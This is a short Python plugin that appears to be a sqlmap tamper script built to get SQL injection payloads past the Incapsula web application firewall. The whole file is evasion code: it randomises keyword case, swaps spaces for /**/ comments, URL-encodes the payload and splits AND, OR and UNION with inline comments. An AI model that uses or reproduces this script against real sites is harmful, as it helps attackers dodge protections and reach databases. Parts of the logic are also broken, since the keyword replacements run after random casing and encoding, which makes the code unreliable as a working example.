from lib.core.enums import PRIORITY
import random
import urllib.parse

__priority__ = PRIORITY.HIGH

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Advanced tamper script for Incapsula WAF.
    - Encodes payload using URL encoding and inline obfuscation.
    - Randomizes the case of SQL keywords.
    - Replaces spaces with multi-character sequences.
    - Adds no-op SQL comments to break pattern matching.
    """
    if payload:
        # Randomize case of SQL keywords
        obfuscated_payload = ''.join(
            char.upper() if random.randint(0, 1) else char.lower() for char in payload
        )

        # Replace spaces with alternatives
        obfuscated_payload = obfuscated_payload.replace(" ", "/**/")

        # URL-encode critical characters
        obfuscated_payload = urllib.parse.quote(obfuscated_payload, safe='()')

        # Inject no-op SQL comments for evasion
        obfuscated_payload = obfuscated_payload.replace("AND", "AN/*no-op*/D")
        obfuscated_payload = obfuscated_payload.replace("OR", "O/**/R")
        obfuscated_payload = obfuscated_payload.replace("UNION", "UNI/**/ON")

        return obfuscated_payload
    return payload
